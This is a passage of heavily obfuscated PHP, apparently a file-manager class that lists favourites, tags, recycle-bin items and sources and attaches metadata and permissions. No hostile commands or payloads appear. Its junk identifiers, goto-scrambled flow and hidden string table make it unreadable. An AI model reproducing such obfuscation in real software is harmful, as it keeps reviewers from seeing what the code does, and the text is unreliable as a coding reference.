$c±ùˆñ‡‰[$c››âÇˆÏğ[395]] . $c››âÇˆÏğ[402]; $c±ùˆñ‡‰[$c››âÇˆÏğ[29]] = $c±ùˆñ‡‰[$c››âÇˆÏğ[403]] == 1 ? $c››âÇˆÏğ[77] : $c››âÇˆÏğ[193]; $c±ùˆñ‡‰[$c››âÇˆÏğ[404]] = $this->typeName($c±ùˆñ‡‰[$c››âÇˆÏğ[404]]); goto Cé³º‚ÈÃ„; fŸøëª”™: } public function listUserFav() { goto d‚½÷êŠ¿Í; fŞ ¾††©¹: $Dğâáß§¦Ü = array_to_keyvalue($Dğâáß§¦Ü, $eÄî¥Üš…[33], $eÄî¥Üš…[76]); if ($Dğâáß§¦Ü) { $f¢£°¾¥£° = $this->listSource(array($eÄî¥Üš…[410] => array($eÄî¥Üš…[411], $Dğâáß§¦Ü))); } $f¢£°¾¥£° = array_to_keyvalue($f¢£°¾¥£°[$eÄî¥Üš…[367]], $eÄî¥Üš…[395]); goto FÊ™Ô×¿ˆ¶; FÊ™Ô×¿ˆ¶: foreach ($F¨Ï‘øá’¬ as &$b‰ƒƒÜ“È) { $b‰ƒƒÜ“È = array($eÄî¥Üš…[412] => $b‰ƒƒÜ“È[$eÄî¥Üš…[393]], $eÄî¥Üš…[413] => $b‰ƒƒÜ“È[$eÄî¥Üš…[28]], $eÄî¥Üš…[414] => $b‰ƒƒÜ“È[$eÄî¥Üš…[76]], $eÄî¥Üš…[415] => $b‰ƒƒÜ“È[$eÄî¥Üš…[29]], $eÄî¥Üš…[416] => $b‰ƒƒÜ“È[$eÄî¥Üš…[194]], $eÄî¥Üš…[417] => $b‰ƒƒÜ“È[$eÄî¥Üš…[84]]); if ($b‰ƒƒÜ“È[$eÄî¥Üš…[29]] == $eÄî¥Üš…[409] && $f¢£°¾¥£°[$b‰ƒƒÜ“È[$eÄî¥Üš…[76]]]) { $b‰ƒƒÜ“È[$eÄî¥Üš…[85]] = $f¢£°¾¥£°[$b‰ƒƒÜ“È[$eÄî¥Üš…[76]]]; } } unset($b‰ƒƒÜ“È); return $F¨Ï‘øá’¬; goto e„´‡×¨¤; d‚½÷êŠ¿Í: $eÄî¥Üš… =& $_SERVER[ÒÆ›ÆØÎ¾]; $F¨Ï‘øá’¬ = Model($eÄî¥Üš…[408])->listData(); $Dğâáß§¦Ü = array_filter_by_field($F¨Ï‘øá’¬, $eÄî¥Üš…[29], $eÄî¥Üš…[409]); goto fŞ ¾††©¹; e„´‡×¨¤: } public function listUserTag($bÔÄ¶‹Ñò‘) { goto D®—Â¦Ù½§; c´Ÿƒ“ÍŞ: if (!$BâÉÌâĞâ || count($B¨ Š·¶Âã) == $BâÉÌâĞâ[$Aø¸¿’¼¹ç[364]][$Aø¸¿’¼¹ç[365]]) { return $BâÉÌâĞâ; } $dí‹¨¬¨ŞĞ = array(); $Céêà•®Ä« = array_to_keyvalue($BâÉÌâĞâ[$Aø¸¿’¼¹ç[75]], $Aø¸¿’¼¹ç[33], $Aø¸¿’¼¹ç[395]); goto bƒš’‚Ò—; DíÕ¦­ŒÕÑ: if ($dí‹¨¬¨ŞĞ) { Model($Aø¸¿’¼¹ç[420])->removeBySource($dí‹¨¬¨ŞĞ); } return $BâÉÌâĞâ; goto FÙ‚‰í; f‰¯›Ê¦Æ: foreach ($CÁí„‡£†Ü as $fºØŸ®Û¨å => $E°¨Û„ÏÄÊ) { $aÑ÷“Ê¦ƒ¤ = !0; if (!$bÔÄ¶‹Ñò‘) { $B¨ Š·¶Âã[] = $fºØŸ®Û¨å; continue; } foreach ($bÔÄ¶‹Ñò‘ as $bÒ­Í¨¤) { if (!in_array($bÒ­Í¨¤, $E°¨Û„ÏÄÊ)) { $aÑ÷“Ê¦ƒ¤ = !1; break; } } if ($aÑ÷“Ê¦ƒ¤) { $B¨ Š·¶Âã[] = $fºØŸ®Û¨å; } } if (!$B¨ Š·¶Âã) { return array(); } $BâÉÌâĞâ = $this->listSource(array($Aø¸¿’¼¹ç[410] => array($Aø¸¿’¼¹ç[411], $B¨ Š·¶Âã))); goto c´Ÿƒ“ÍŞ; D®—Â¦Ù½§: $Aø¸¿’¼¹ç =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($bÔÄ¶‹Ñò‘ && !is_array($bÔÄ¶‹Ñò‘)) { $bÔÄ¶‹Ñò‘ = array($bÔÄ¶‹Ñò‘); } $c–Ö¤”áŞÚ = Model($Aø¸¿’¼¹ç[418])->listData(); goto d­ğÂ¿Ú’Ò; bƒš’‚Ò—: $Bø‹¹¸¥‹¨ = array_to_keyvalue($BâÉÌâĞâ[$Aø¸¿’¼¹ç[74]], $Aø¸¿’¼¹ç[33], $Aø¸¿’¼¹ç[395]); $F¯…àğ³¶ = array_merge($Bø‹¹¸¥‹¨, $Céêà•®Ä«); foreach ($B¨ Š·¶Âã as $E×Îä„‹È¤) { if (!in_array($E×Îä„‹È¤, $F¯…àğ³¶)) { $dí‹¨¬¨ŞĞ[] = $E×Îä„‹È¤; } } goto DíÕ¦­ŒÕÑ; d­ğÂ¿Ú’Ò: $CÁí„‡£†Ü = array(); foreach ($c–Ö¤”áŞÚ as $BŒ™îÛ‡‰) { $E×Îä„‹È¤ = $BŒ™îÛ‡‰[$Aø¸¿’¼¹ç[76]]; if (!$E×Îä„‹È¤) { continue; } if (!isset($CÁí„‡£†Ü[$E×Îä„‹È¤])) { $CÁí„‡£†Ü[$E×Îä„‹È¤] = array(); } $CÁí„‡£†Ü[$E×Îä„‹È¤][] = $BŒ™îÛ‡‰[$Aø¸¿’¼¹ç[419]]; } $B¨ Š·¶Âã = array(); goto f‰¯›Ê¦Æ; FÙ‚‰í: } public function listUserRecycle() { $B‰Î‚ø¥ñğ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÜÏöÙÁ = Model($B‰Î‚ø¥ñğ[421])->listData(); if (!$cÜÏöÙÁ) { return array(); } $FÃŠ™ø®í² = array($B‰Î‚ø¥ñğ[410] => array($B‰Î‚ø¥ñğ[411], $cÜÏöÙÁ), $B‰Î‚ø¥ñğ[422] => 1); return $this->listSource($FÃŠ™ø®í²); } public function listSource($DèÎŸÍ§°Ç, $B¾„¹·çÅ‚ = 3000) { goto d•ñÉÚ­Ç‰; CÌ‡À†ÏÅ²: $dÚß˜œÁ¬ = $this->field($D•¾µİîï”)->_makeOrder()->where($DèÎŸÍ§°Ç)->selectPage($B¾„¹·çÅ‚); $this->_listDataApply($dÚß˜œÁ¬[$D‹……ºŸÕ[367]]); $this->_listMake($dÚß˜œÁ¬); goto e½¢®Ï¹çé; e½¢®Ï¹çé: return $dÚß˜œÁ¬; goto e¥‹ù×ÄÃˆ; d•ñÉÚ­Ç‰: $D‹……ºŸÕ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($DèÎŸÍ§°Ç[$D‹……ºŸÕ[423]])) { $DèÎŸÍ§°Ç[$D‹……ºŸÕ[423]] = 0; } $D•¾µİîï” = $D‹……ºŸÕ[424]; goto CÌ‡À†ÏÅ²; e¥‹ù×ÄÃˆ: } protected function _makeOrder() { goto A÷‡“˜ô¾È; A÷‡“˜ô¾È: $A‡á…Ÿàœ± =& $_SERVER[ÒÆ›ÆØÎ¾]; $C¶×£‡ŠİÖ = Model($A‡á…Ÿàœ±[425])->get($A‡á…Ÿàœ±[426]); $A±’„ƒõã = Model($A‡á…Ÿàœ±[425])->get($A‡á…Ÿàœ±[427]); goto f§‘¶áÉ¶; f§‘¶áÉ¶: $EàáÅ²¬ë³ = array($A‡á…Ÿàœ±[428] => $A‡á…Ÿàœ±[429], $A‡á…Ÿàœ±[430] => $A‡á…Ÿàœ±[431]); $Aò¸Œ‚½òÍ = array($A‡á…Ÿàœ±[28] => $A‡á…Ÿàœ±[28], $A‡á…Ÿàœ±[78] => $A‡á…Ÿàœ±[78], $A‡á…Ÿàœ±[168] => $A‡á…Ÿàœ±[405], $A‡á…Ÿàœ±[432] => $A‡á…Ÿàœ±[432], $A‡á…Ÿàœ±[433] => $A‡á…Ÿàœ±[434], $A‡á…Ÿàœ±[194] => $A‡á…Ÿàœ±[194], $A‡á…Ÿàœ±[84] => $A‡á…Ÿàœ±[84]); $E†“µôë‰ = Input::get($A‡á…Ÿàœ±[435], $A‡á…Ÿàœ±[7], $C¶×£‡ŠİÖ, array_keys($Aò¸Œ‚½òÍ)); goto bÍÔš­’Œß; bÍÔš­’Œß: $aÍë¯Ñ•ƒ = Input::get($A‡á…Ÿàœ±[436], $A‡á…Ÿàœ±[7], $A±’„ƒõã, array_keys($EàáÅ²¬ë³)); if (!in_array($E†“µôë‰, array_keys($Aò¸Œ‚½òÍ))) { $E†“µôë‰ = $A‡á…Ÿàœ±[28]; } if (!in_array($aÍë¯Ñ•ƒ, array_keys($EàáÅ²¬ë³))) { $E†“µôë‰ = $A‡á…Ÿàœ±[428]; } goto C‚ñ²¹ÏÕ®; C‚ñ²¹ÏÕ®: if ($E†“µôë‰ == $A‡á…Ÿàœ±[28]) { } $AÜ×Ÿ«»ê = $A‡á…Ÿàœ±[437] . $Aò¸Œ‚½òÍ[$E†“µôë‰] . $A‡á…Ÿàœ±[50] . $EàáÅ²¬ë³[$aÍë¯Ñ•ƒ]; return $this->order(rtrim(trim($AÜ×Ÿ«»ê), $A‡á…Ÿàœ±[47])); goto DéâŒõ¸‚; DéâŒõ¸‚: } protected function _listDataApplyItem($Fª–¶£»¾Ò, $DÁ¿¡¡®Ì“ = false) { $C‚§†¨êÚ = array($Fª–¶£»¾Ò); $this->_listDataApply($C‚§†¨êÚ, $DÁ¿¡¡®Ì“); return $C‚§†¨êÚ[0]; } protected function _listDataApply(&$D½—²å„, $a‹ŸÓ«âä¸ = false) { goto FµÚ´»ÊóË; cºˆ¾ŸÏÕ: $this->_listAppendUser($D½—²å„); $this->_listFilterInfo($D½—²å„, $a‹ŸÓ«âä¸); goto E‚‰°Ÿ°´ª; CÖ¿°ÃÚÍ¡: $báµ¬¶¥Ù = array_unique($báµ¬¶¥Ù); $this->_listSourceCache($D½—²å„); if (!$a‹ŸÓ«âä¸) { $this->_listAppendMeta($D½—²å„, $báµ¬¶¥Ù); $this->_listAppendFileMeta($D½—²å„, $báµ¬¶¥Ù); $this->_listAppendChildren($D½—²å„, $báµ¬¶¥Ù); } goto eŸ½àñ ; eŸ½àñ : $this->_listAppendPath($D½—²å„); $this->_listAppendAuth($D½—²å„); $this->_listAppendSourceInfo($D½—²å„, $báµ¬¶¥Ù); goto cºˆ¾ŸÏÕ; FµÚ´»ÊóË: $AÖô¿Š–²¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$D½—²å„) { $D½—²å„ = array(); return; } $báµ¬¶¥Ù = array_to_keyvalue($D½—²å„, $AÖô¿Š–²¤[33], $AÖô¿Š–²¤[395]); goto CÖ¿°ÃÚÍ¡; E‚‰°Ÿ°´ª: } protected function _listSourceCache($fÒ¿‹ÙŠæ¡) { $a§ßÓ¸¯Ñ› =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($fÒ¿‹ÙŠæ¡ as $e§Å‹Ãİ†) { self::$cacheSourceInfo[$a§ßÓ¸¯Ñ›[438] . $e§Å‹Ãİ†[$a§ßÓ¸¯Ñ›[395]]] = $e§Å‹Ãİ†; } } protected function _listFilterInfo(&$dˆß™‚Ş›®, $aâÁ…±¨õ = false) { $c·­÷á‡äİ =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($dˆß™‚Ş›® as &$dÕ­·æÅŒß) { $dÕ­·æÅŒß = $this->pathInfoFilter($dÕ­·æÅŒß); self::$cachePathInfo[$c·­÷á‡äİ[439] . intval($aâÁ…±¨õ) . $c·­÷á‡äİ[440] . $dÕ­·æÅŒß[$c·­÷á‡äİ[395]]] = $dÕ­·æÅŒß; } unset($dÕ­·æÅŒß); } protected function _listMake(&$dãèĞõÇÓ‚) { $eìÅÄÀ°óö =& $_SERVER[ÒÆ›ÆØÎ¾]; $dãèĞõÇÓ‚[$eìÅÄÀ°óö[75]] = array(); $dãèĞõÇÓ‚[$eìÅÄÀ°óö[74]] = array(); foreach ($dãèĞõÇÓ‚[$eìÅÄÀ°óö[367]] as $AëíïÂ¿¥­) { $dÜ²‰“ˆÆÃ = $AëíïÂ¿¥­[$eìÅÄÀ°óö[403]] == 1 ? $eìÅÄÀ°óö[75] : $eìÅÄÀ°óö[74]; $dãèĞõÇÓ‚[$dÜ²‰“ˆÆÃ][] = $AëíïÂ¿¥­; } unset($dãèĞõÇÓ‚[$eìÅÄÀ°óö[367]]); } protected function _listAppendMeta(&$E½ãîñªÆŠ, $b†¢»ÜÓ ¢) { goto A¡ìÅÍ„¯Æ; A¡ìÅÍ„¯Æ: $E¼ëåÌì Á =& $_SERVER[ÒÆ›ÆØÎ¾]; $f¸°åŞóŠ£ = array($E¼ëåÌì Á[410] => array($E¼ëåÌì Á[411], $b†¢»ÜÓ ¢)); $b‚°¹¨¢¹ = Model($E¼ëåÌì Á[441])->field($E¼ëåÌì Á[442])->where($f¸°åŞóŠ£)->select(); goto F‹†¡ëÈò“; F‹†¡ëÈò“: if (!$b‚°¹¨¢¹) { return; } $bìï„‚ÒìØ = array($E¼ëåÌì Á[443], $E¼ëåÌì Á[444]); $Aò»íŒ¾« = array(); goto AÇ¾æÜÏ‹; AÇ¾æÜÏ‹: foreach ($b‚°¹¨¢¹ as $e·äçÜÁë) { if (!isset($Aò»íŒ¾«[$e·äçÜÁë[$E¼ëåÌì Á[395]]])) { $Aò»íŒ¾«[$e·äçÜÁë[$E¼ëåÌì Á[395]]] = array(); } if (in_array($e·äçÜÁë[$E¼ëåÌì Á[93]], $bìï„‚ÒìØ)) { continue; } $Aò»íŒ¾«[$e·äçÜÁë[$E¼ëåÌì Á[395]]][$e·äçÜÁë[$E¼ëåÌì Á[93]]] = $e·äçÜÁë[$E¼ëåÌì Á[372]]; } foreach ($E½ãîñªÆŠ as &$D¸ß£”¬İÍ) { $D¸ß£”¬İÍ[$E¼ëåÌì Á[445]] = !1; if (isset($Aò»íŒ¾«[$D¸ß£”¬İÍ[$E¼ëåÌì Á[395]]])) { $D¸ß£”¬İÍ[$E¼ëåÌì Á[445]] = $Aò»íŒ¾«[$D¸ß£”¬İÍ[$E¼ëåÌì Á[395]]]; } if ($this->fileIsLock($D¸ß£”¬İÍ) && $D¸ß£”¬İÍ[$E¼ëåÌì Á[406]]) { $f¥µ¢Î££¹ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $D¸ß£”¬İÍ[$E¼ëåÌì Á[406]][$E¼ëåÌì Á[407]] = AuthModel::authDisable($D¸ß£”¬İÍ[$E¼ëåÌì Á[406]][$E¼ëåÌì Á[407]], $f¥µ¢Î££¹); $D¸ß£”¬İÍ[$E¼ëåÌì Á[406]][$E¼ëåÌì Á[446]][$E¼ëåÌì Á[406]] = $D¸ß£”¬İÍ[$E¼ëåÌì Á[406]][$E¼ëåÌì Á[407]]; } } unset($D¸ß£”¬İÍ); goto Eëò¥¢ñåº; Eëò¥¢ñåº: } protected function _listAppendFileMeta(&$Aöà–ÛÒÇš, $BÔêİŒŞ) { goto càÂ‰Ò¿»æ; CíÀÀ·Ü¯‚: if (!$fÇƒŠœğ¯„) { return; } $Eæ„˜ÚÄ½Ê = array($dÄ‰‚Ö÷¦[448] => array($dÄ‰‚Ö÷¦[411], $fÇƒŠœğ¯„)); $E½¼À×ÈÈ° = $dÄ‰‚Ö÷¦[449]; goto dÅÕ­çö«Á; F°‚„‚ö¾: foreach ($Aöà–ÛÒÇš as &$bÕª¤¢Ï’ ) { goto AÙ£Ãª¼‚ç; CÈÑ•ãŸè: $E¯Şê‡øÈ[$dÄ‰‚Ö÷¦[78]] = $bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[78]]; $E¯Şê‡øÈ[$dÄ‰‚Ö÷¦[28]] = $bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[28]]; if (!isset(self::$cacheFileInfo[$dÄ‰‚Ö÷¦[453] . $Eá¡¥ÏÕ‘Õ])) { self::$cacheFileInfo[$dÄ‰‚Ö÷¦[453] . $Eá¡¥ÏÕ‘Õ] = array_merge(array(), $E¯Şê‡øÈ); } goto bƒ¤ÔÜ¦†; AÙ£Ãª¼‚ç: $Eá¡¥ÏÕ‘Õ = $bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[447]]; if (!$Eá¡¥ÏÕ‘Õ || !is_array($B‰îµÁ£ø[$Eá¡¥ÏÕ‘Õ])) { continue; } $E¯Şê‡øÈ = $B‰îµÁ£ø[$Eá¡¥ÏÕ‘Õ]; goto CÈÑ•ãŸè; C„½‚‰ÊŠ: if (isset($bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[164]][$dÄ‰‚Ö÷¦[163]])) { $bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[163]] = json_decode($bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[164]][$dÄ‰‚Ö÷¦[163]], !0); unset($bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[164]][$dÄ‰‚Ö÷¦[163]]); } goto EÙÇ‹ã·İÍ; bƒ¤ÔÜ¦†: unset($B‰îµÁ£ø[$Eá¡¥ÏÕ‘Õ][$dÄ‰‚Ö÷¦[76]]); $bˆ²˜…’‰ƒ = is_array($e” ‡ƒ¼Ù[$Eá¡¥ÏÕ‘Õ]) ? $e” ‡ƒ¼Ù[$Eá¡¥ÏÕ‘Õ] : array(); $bÕª¤¢Ï’ [$dÄ‰‚Ö÷¦[164]] = array_merge($bˆ²˜…’‰ƒ, $B‰îµÁ£ø[$Eá¡¥ÏÕ‘Õ]); goto C„½‚‰ÊŠ; EÙÇ‹ã·İÍ: } unset($bÕª¤¢Ï’ ); goto fƒ»§®õÑô; càÂ‰Ò¿»æ: $dÄ‰‚Ö÷¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÇƒŠœğ¯„ = array_to_keyvalue($Aöà–ÛÒÇš, $dÄ‰‚Ö÷¦[33], $dÄ‰‚Ö÷¦[447]); $fÇƒŠœğ¯„ = array_filter(array_unique($fÇƒŠœğ¯„)); goto CíÀÀ·Ü¯‚; aÍ‹íŞ¼æâ: $dù‰³¿à³Ô = $dù‰³¿à³Ô ? $dù‰³¿à³Ô : array(); $e” ‡ƒ¼Ù = array(); foreach ($dù‰³¿à³Ô as $Aß²’ñä‹‡) { if (!isset($e” ‡ƒ¼Ù[$Aß²’ñä‹‡[$dÄ‰‚Ö÷¦[447]]])) { $e” ‡ƒ¼Ù[$Aß²’ñä‹‡[$dÄ‰‚Ö÷¦[447]]] = array(); } $e” ‡ƒ¼Ù[$Aß²’ñä‹‡[$dÄ‰‚Ö÷¦[447]]][$Aß²’ñä‹‡[$dÄ‰‚Ö÷¦[93]]] = $Aß²’ñä‹‡[$dÄ‰‚Ö÷¦[372]]; } goto F°‚„‚ö¾; dÅÕ­çö«Á: $B‰îµÁ£ø = Model($dÄ‰‚Ö÷¦[450])->field($E½¼À×ÈÈ°)->where($Eæ„˜ÚÄ½Ê)->select(); $B‰îµÁ£ø = array_to_keyvalue($B‰îµÁ£ø, $dÄ‰‚Ö÷¦[447]); $dù‰³¿à³Ô = Model($dÄ‰‚Ö÷¦[451])->field($dÄ‰‚Ö÷¦[452])->where($Eæ„˜ÚÄ½Ê)->select(); goto aÍ‹íŞ¼æâ; fƒ»§®õÑô: } protected function _listAppendSourceInfo(&$CªƒƒïÔì„, $Eˆæ„èË‰) { goto a æ¾‡ÇÅ; a æ¾‡ÇÅ: $fÇ›¼•î‚¢ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!defined($fÇ›¼•î‚¢[454])) { return; } $eÎù¦…›ŠØ = Model($fÇ›¼•î‚¢[455])->listData(); goto D³‹Íîóî„; c¥ØÖÄ‰ùÖ: return $CªƒƒïÔì„; goto E®¿ô‡Š¶Ñ; D³‹Íîóî„: $d•·ô³õƒ¬ = Model($fÇ›¼•î‚¢[418])->listData(); $F‚â«¡—Ÿˆ = Model($fÇ›¼•î‚¢[408])->listData(); $EÄïêÏØÖà = Model($fÇ›¼•î‚¢[456])->listSimple(); goto E®îí„šÜ©; BÈîŠÇİºÁ: $EÔ‡´óÚ¿ƒ = array_to_keyvalue_group($EÄïêÏØÖà, $fÇ›¼•î‚¢[395]); foreach ($CªƒƒïÔì„ as &$EÛé Í‘óí) { $EÛé Í‘óí[$fÇ›¼•î‚¢[85]] = array($fÇ›¼•î‚¢[457] => 0, $fÇ›¼•î‚¢[458] => 0, $fÇ›¼•î‚¢[459] => 0); if (isset($cÄñøÑÄå[$EÛé Í‘óí[$fÇ›¼•î‚¢[395]]])) { $EÛé Í‘óí[$fÇ›¼•î‚¢[85]][$fÇ›¼•î‚¢[460]] = 1; $EÛé Í‘óí[$fÇ›¼•î‚¢[85]][$fÇ›¼•î‚¢[461]] = $cÄñøÑÄå[$EÛé Í‘óí[$fÇ›¼•î‚¢[395]]][$fÇ›¼•î‚¢[28]]; } if (isset($bé’ÒÉ’[$EÛé Í‘óí[$fÇ›¼•î‚¢[395]]])) { $EÛé Í‘óí[$fÇ›¼•î‚¢[85]][$fÇ›¼•î‚¢[462]] = array(); foreach ($bé’ÒÉ’[$EÛé Í‘óí[$fÇ›¼•î‚¢[395]]] as $D¯¿Ü½ˆÎÈ) { $a³ç—¸‹¥ = $BƒĞŒ©êÍ[$D¯¿Ü½ˆÎÈ]; $EÛé Í‘óí[$fÇ›¼•î‚¢[85]][$fÇ›¼•î‚¢[462]][] = array($fÇ›¼•î‚¢[463] => $a³ç—¸‹¥[$fÇ›¼•î‚¢[393]], $fÇ›¼•î‚¢[413] => $a³ç—¸‹¥[$fÇ›¼•î‚¢[28]], $fÇ›¼•î‚¢[464] => $a³ç—¸‹¥[$fÇ›¼•î‚¢[465]]); } } if (isset($EÔ‡´óÚ¿ƒ[$EÛé Í‘óí[$fÇ›¼•î‚¢[395]]])) { $EÛé Í‘óí[$fÇ›¼•î‚¢[85]][$fÇ›¼•î‚¢[466]] = array(); foreach ($EÔ‡´óÚ¿ƒ[$EÛé Í‘óí[$fÇ›¼•î‚¢[395]]] as $dçİáãª±í) { $EÛé Í‘óí[$fÇ›¼•î‚¢[85]][$fÇ›¼•î‚¢[466]] = array($fÇ›¼•î‚¢[467] => $dçİáãª±í[$fÇ›¼•î‚¢[468]], $fÇ›¼•î‚¢[469] => $dçİáãª±í[$fÇ›¼•î‚¢[470]], $fÇ›¼•î‚¢[471] => $dçİáãª±í[$fÇ›¼•î‚¢[395]], $fÇ›¼•î‚¢[472] => $dçİáãª±í[$fÇ›¼•î‚¢[473]], $fÇ›¼•î‚¢[474] => $dçİáãª±í[$fÇ›¼•î‚¢[475]], $fÇ›¼•î‚¢[476] => $dçİáãª±í[$fÇ›¼•î‚¢[476]], $fÇ›¼•î‚¢[477] => $dçİáãª±í[$fÇ›¼•î‚¢[477]]); } } } unset($EÛé Í‘óí); goto c¥ØÖÄ‰ùÖ; E®îí„šÜ©: $BƒĞŒ©êÍ = array_to_keyvalue($eÎù¦…›ŠØ, $fÇ›¼•î‚¢[393]); $bé’ÒÉ’ = array_to_keyvalue_group($d•·ô³õƒ¬, $fÇ›¼•î‚¢[76], $fÇ›¼•î‚¢[419]); $cÄñøÑÄå = array_to_keyvalue($F‚â«¡—Ÿˆ, $fÇ›¼•î‚¢[76]); goto BÈîŠÇİºÁ; E®¿ô‡Š¶Ñ: } protected function _listAppendChildren(&$bìòâ©¸µª, $eöÒ˜ï®·ï) { goto CªÀ‚µÑË; D¦ÒÊƒÓªÒ: $A­äâ… = array($c¾½çÃ‚Å[478] => array($c¾½çÃ‚Å[7], $f‚Ç¥‘¨ÖÑ)); $CÆÉ²öæ‚é = array($c¾½çÃ‚Å[478], $c¾½çÃ‚Å[403], $c¾½çÃ‚Å[479] => $c¾½çÃ‚Å[480]); $e´ Ä•¶ì‘ = $this->field($CÆÉ²öæ‚é)->where($A­äâ…)->group($c¾½çÃ‚Å[481])->select(); goto AÒÜ«¿Â; f¯Ã›¨Ó”®: foreach ($bìòâ©¸µª as &$bÆ’µµà­õ) { if (!$bÆ’µµà­õ[$c¾½çÃ‚Å[403]]) { continue; } $f‚Ç¥‘¨ÖÑ[] = $bÆ’µµà­õ[$c¾½çÃ‚Å[395]]; } unset($bÆ’µµà­õ); if (!$f‚Ç¥‘¨ÖÑ) { return; } goto D¦ÒÊƒÓªÒ; dµ†¢šÒèó: unset($bÆ’µµà­õ); goto CóÁëáÛ; CªÀ‚µÑË: $c¾½çÃ‚Å =& $_SERVER[ÒÆ›ÆØÎ¾]; $f‚Ç¥‘¨ÖÑ = array(); $fŠ¿Õ¾¡©â = array($c¾½çÃ‚Å[203] => 0, $c¾½çÃ‚Å[204] => 0); goto f¯Ã›¨Ó”®; AÒÜ«¿Â: $dˆæëÎ¬í = array(); foreach ($e´ Ä•¶ì‘ as $CĞ”´Î„Ñ¹) { $d”ôášäë« = $CĞ”´Î„Ñ¹[$c¾½çÃ‚Å[478]]; $cÎÇŒÈ‘ƒé = $CĞ”´Î„Ñ¹[$c¾½çÃ‚Å[403]] == $c¾½çÃ‚Å[87] ? $c¾½çÃ‚Å[204] : $c¾½çÃ‚Å[203]; if (!isset($dˆæëÎ¬í[$d”ôášäë«])) { $dˆæëÎ¬í[$d”ôášäë«] = array($c¾½çÃ‚Å[203] => 0, $c¾½çÃ‚Å[204] => 0); } $dˆæëÎ¬í[$d”ôášäë«][$cÎÇŒÈ‘ƒé] += $CĞ”´Î„Ñ¹[$c¾½çÃ‚Å[480]]; } foreach ($bìòâ©¸µª as &$bÆ’µµà­õ) { if (!$bÆ’µµà­õ[$c¾½çÃ‚Å[403]]) { continue; } $D½‚ò­òÑ² = is_array($dˆæëÎ¬í[$bÆ’µµà­õ[$c¾½çÃ‚Å[395]]]) ? $dˆæëÎ¬í[$bÆ’µµà­õ[$c¾½çÃ‚Å[395]]] : $fŠ¿Õ¾¡©â; $bÆ’µµà­õ[$c¾½çÃ‚Å[204]] = $D½‚ò­òÑ²[$c¾½çÃ‚Å[204]]; $bÆ’µµà­õ[$c¾½çÃ‚Å[203]] = $D½‚ò­òÑ²[$c¾½çÃ‚Å[203]]; unset($bÆ’µµà­õ[$c¾½çÃ‚Å[405]]); } goto dµ†¢šÒèó; CóÁëáÛ: } protected function _listAppendAuth(&$cô—“éÙ‘µ) { goto EªÓê¼ƒäØ; EªÓê¼ƒäØ: $d’˜ª¢õŞ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!defined($d’˜ª¢õŞ[454])) { return; } $b‘ãÙâ‰Ô÷ = array(); goto AÕ³øµà˜; b­—Ä¯‰«: $Fõ…ÔçòË´ = Model($d’˜ª¢õŞ[482])->getSourceList($b‘ãÙâ‰Ô÷, $Dµ¡Ì‘µ¯†); foreach ($cô—“éÙ‘µ as $a˜³Á¨˜ä => &$càÆŠƒ‡™„) { $càÆŠƒ‡™„[$d’˜ª¢õŞ[406]] = $Fõ…ÔçòË´[$càÆŠƒ‡™„[$d’˜ª¢õŞ[395]]]; if (!$càÆŠƒ‡™„[$d’˜ª¢õŞ[406]] && $càÆŠƒ‡™„[$d’˜ª¢õŞ[404]] == self::TYPE_GROUP) { $càÆŠƒ‡™„[$d’˜ª¢õŞ[406]] = Action($d’˜ª¢õŞ[483])->pathGroupAuthMake($càÆŠƒ‡™„[$d’˜ª¢õŞ[484]]); if (!$càÆŠƒ‡™„[$d’˜ª¢õŞ[406]] && !_get($GLOBALS, $d’˜ª¢õŞ[485])) { $càÆŠƒ‡™„[$d’˜ª¢õŞ[196]] = !1; $càÆŠƒ‡™„[$d’˜ª¢õŞ[195]] = !1; } } if ($càÆŠƒ‡™„[$d’˜ª¢õŞ[406]]) { $càÆŠƒ‡™„[$d’˜ª¢õŞ[196]] = AuthModel::authCheckEdit($càÆŠƒ‡™„[$d’˜ª¢õŞ[406]][$d’˜ª¢õŞ[407]]); $càÆŠƒ‡™„[$d’˜ª¢õŞ[195]] = AuthModel::authCheckView($càÆŠƒ‡™„[$d’˜ª¢õŞ[406]][$d’˜ª¢õŞ[407]]); } $this->groupPathDisplay($càÆŠƒ‡™„); } unset($càÆŠƒ‡™„); goto eÄÃ¼·¹ê; AÕ³øµà˜: foreach ($cô—“éÙ‘µ as $càÆŠƒ‡™„) { if ($càÆŠƒ‡™„[$d’˜ª¢õŞ[404]] == self::TYPE_GROUP) { $b‘ãÙâ‰Ô÷[] = $càÆŠƒ‡™„[$d’˜ª¢õŞ[395]]; } } if (!$b‘ãÙâ‰Ô÷) { return; } $Dµ¡Ì‘µ¯† = array_to_keyvalue($cô—“éÙ‘µ, $d’˜ª¢õŞ[395]); goto b­—Ä¯‰«; eÄÃ¼·¹ê: } public function groupPathDisplay(&$EíİØ‡²¼) { goto cäÌ¡Ø¾Ï; aŒ¾Ñµ‡„¬: $EíİØ‡²¼[$E…‰º•ù×ñ[492]] = $bÇ‹ƒŸ¯ùæ . $B—Œ¹†œ–¤[$E…‰º•ù×ñ[85]][$E…‰º•ù×ñ[395]]; goto eÊ”Œ¦Æ™†; fØ’¬ˆ‹Œ: $EíİØ‡²¼[$E…‰º•ù×ñ[488]] = $B—Œ¹†œ–¤[$E…‰º•ù×ñ[478]]; $EíİØ‡²¼[$E…‰º•ù×ñ[489]] = $B—Œ¹†œ–¤[$E…‰º•ù×ñ[487]]; $EíİØ‡²¼[$E…‰º•ù×ñ[490]] = $B—Œ¹†œ–¤[$E…‰º•ù×ñ[491]]; goto aŒ¾Ñµ‡„¬; EÏ›êÒ×Ã: $c…Õ­¾­¨ = $this->parentLevelArray($B—Œ¹†œ–¤[$E…‰º•ù×ñ[487]]); $bÇ‹ƒŸ¯ùæ = $E…‰º•ù×ñ[33]; foreach 